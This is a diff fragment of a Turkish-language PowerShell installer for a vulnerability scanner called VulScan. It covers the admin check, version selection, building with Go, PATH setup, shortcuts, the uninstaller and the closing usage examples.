+        Write-ColorOutput "Bu installer yönetici hakları gerektirir!" "Red" "[ERROR]"
+        Write-ColorOutput "PowerShell'i 'Yönetici olarak çalıştır' seçeneği ile açın." "Red" "[ERROR]"
+        exit 1
+    }
+    
+    Write-ColorOutput "Yönetici hakları doğrulandı ✓" "Green" "[SUCCESS]"
+    
+    # Version selection
+    if (-not $Version) {
+        if (-not $Quiet) {
+            Write-Host "══════════════════════════════════════════════════════════════════" -ForegroundColor Yellow
+            Write-Host "                         SÜRÜM SEÇİMİ" -ForegroundColor Yellow
+            Write-Host "══════════════════════════════════════════════════════════════════" -ForegroundColor Yellow
+            Write-Host ""
+            Write-Host "Hangi sürümü kurmak istiyorsunuz?" -ForegroundColor White
+            Write-Host ""
+            Write-Host "[1] Stable Release (v3.0) - Kararlı sürüm" -ForegroundColor Green
+            Write-Host "    └─ Ana geliştirme dalı, test edilmiş ve kararlı" -ForegroundColor Gray
+            Write-Host ""
+            Write-Host "[2] Development Release (v4.0.0-dev) - Geliştirme sürümü" -ForegroundColor Yellow
+            Write-Host "    └─ Yeni özellikler, güncel güncellemeler" -ForegroundColor Gray
+            Write-Host ""
+            Write-Host "[3] Manuel Kurulum - Kendi .exe dosyanızı kullanın" -ForegroundColor Cyan
+            Write-Host ""
+        }
+        
+        $choice = Get-UserChoice "Seçiminizi yapın (1/2/3)" @("1", "2", "3") "1"
+        
+        switch ($choice) {
+            "1" { $Version = "stable" }
+            "2" { $Version = "dev" }
+            "3" { $Version = "manual" }
+        }
+    }
+    
+    if ($Version -eq "manual") {
+        Write-ColorOutput "Manuel kurulum seçildi" "Cyan"
+        Write-ColorOutput "Lütfen 'vulscan.exe' dosyasını bu dizine koyun: $PSScriptRoot" "White"
+        
+        do {
+            $continue = Get-UserChoice "Hazır olduğunuzda 'y' yazın" @("y", "Y") "y"
+            if (-not (Test-Path "$PSScriptRoot\vulscan.exe")) {
+                Write-ColorOutput "vulscan.exe dosyası bulunamadı!" "Red" "[ERROR]"
+            }
+        } while (-not (Test-Path "$PSScriptRoot\vulscan.exe"))
+        
+        # Copy manual exe to temp directory
+        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+        Copy-Item -Path "$PSScriptRoot\vulscan.exe" -Destination "$tempDir\vulscan.exe"
+        $selectedVersionTag = "v3.0-manual"
+    }
+    else {
+        $versionInfo = $urls[$Version]
+        Write-ColorOutput "$($versionInfo.desc) seçildi" "Green" "[SUCCESS]"
+        
+        # Check Go installation
+        $goInstalled, $goVersion = Test-GoInstalled
+        if (-not $goInstalled) {
+            Write-ColorOutput "Go bulunamadı! VulScan'i derlemek için Go gerekli." "Red" "[ERROR]"
+            Write-ColorOutput "Go'yu şuradan indirin: https://golang.org/dl/" "White"
+            exit 1
+        }
+        
+        Write-ColorOutput "Go bulundu: $goVersion ✓" "Green" "[SUCCESS]"
+        
+        # Download and build
+        $buildSuccess = Install-VulScan -SelectedVersion $Version -SourceUrl $versionInfo.url -VersionTag $versionInfo.tag
+        if (-not $buildSuccess) {
+            exit 1
+        }
+        
+        $selectedVersionTag = $versionInfo.tag
+    }
+    
+    # Install files
+    $installSuccess = Install-Files -VersionTag $selectedVersionTag
+    if (-not $installSuccess) {
+        exit 1
+    }
+    
+    # Add to PATH
+    Add-ToPath | Out-Null
+    
+    # Create shortcuts
+    Create-Shortcuts -VersionTag $selectedVersionTag | Out-Null
+    
+    # Create uninstaller
+    Create-Uninstaller -VersionTag $selectedVersionTag | Out-Null
+    
+    # Register with Windows
+    Register-WithWindows -VersionTag $selectedVersionTag | Out-Null
+    
+    # Test installation
+    Test-Installation | Out-Null
+    
+    # Clean up
+    Clean-TempFiles
+    
+    # Success message
+    if (-not $Quiet) {
+        Write-Host ""
+        Write-Host "══════════════════════════════════════════════════════════════════" -ForegroundColor Green
+        Write-Host "                      KURULUM TAMAMLANDI!" -ForegroundColor Green
+        Write-Host "══════════════════════════════════════════════════════════════════" -ForegroundColor Green
+        Write-Host ""
+        Write-Host "✅ VulScan başarıyla kuruldu!" -ForegroundColor Green
+        Write-Host ""
+        Write-Host "📁 Kurulum dizini: $InstallPath" -ForegroundColor White
+        Write-Host "⚙️  Yapılandırma: $configDir\config.yaml" -ForegroundColor White
+        Write-Host "🎯 Payloadlar: $payloadsDir\" -ForegroundColor White
+        Write-Host ""
+        Write-Host "🚀 KULLANIM ÖRNEKLERİ:" -ForegroundColor Yellow
+        Write-Host "────────────────────────────────────────────────────────────────" -ForegroundColor Gray
+        Write-Host "  vulscan http://example.com" -ForegroundColor Cyan
+        Write-Host "  vulscan --help" -ForegroundColor Cyan
+        Write-Host "  vulscan --verbose http://example.com/page.php?id=1" -ForegroundColor Cyan
+        Write-Host "  vulscan --output report.json --report http://example.com" -ForegroundColor Cyan
+        Write-Host "  vuls http://example.com  (kısa komut)" -ForegroundColor Cyan
+        Write-Host ""
+        Write-Host "💡 İPUCU: Yeni terminal oturumu açarak komutları kullanmaya başlayın!" -ForegroundColor Yellow
+        Write-Host ""
+        Write-Host "📋 Başlat Menüsü: Başlat > VulScan" -ForegroundColor White
+        Write-Host "🗑️  Kaldırmak için: Programs and Features veya uninstall.bat" -ForegroundColor White
+        Write-Host ""
+        Write-Host "Kurulum tamamlandı! Yeni terminal açarak 'vulscan --help' komutunu deneyin." -ForegroundColor Green
+    }
+    
+    exit 0
+}
+catch {
+    Write-ColorOutput "Kurulum sırasında kritik hata: $($_.Exception.Message)" "Red" "[ERROR]"
+    Clean-TempFiles
+    exit 1
+}
+finally {
+    if (-not $Quiet) {
+        Write-Host ""
+        Read-Host "Çıkmak için Enter'a basın"
+    }
+}
+
+# Entry point
+if ($MyInvocation.InvocationName -ne '.') {
+    Start-Installation
+}
